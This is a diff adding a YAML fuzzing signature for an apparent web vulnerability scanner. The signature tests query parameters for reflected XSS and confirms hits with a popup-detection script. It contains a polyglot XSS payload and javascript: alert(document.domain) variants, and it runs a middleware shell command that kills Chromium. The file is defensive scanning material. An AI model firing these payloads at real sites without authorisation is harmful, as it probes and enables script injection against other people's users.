@@ -1,0 +1,26 @@
+# info to search signature
+id: Fuzz XSS Reflected
+type: fuzz
+info:
+  name: XSS Reflected
+  risk: High
+
+variables:
+  - pl: |
+        javascript%3a/*%22/*%2560/*%27/*/%22/*--></title></textarea></noscript></noembed></template></style></script>%26lt%3b<script>/**/alert()//%26lt%3b</script><iframe/onload%3dalert(document.domain)>
+        alert(document.domain)
+        javascript:alert(document.domain)
+payloads:
+  - "{{.pl}}"
+requests:
+  - generators:
+      - Query("{{.payload}}")
+    middlewares:
+      - >-
+        InvokeCmd("node detectpopup.js '{{.InjectedURL}}';killall -9 Chromium")
+
+    detections:
+      - >-
+        StringSearch("middleware", "XSS Detected")
+
+
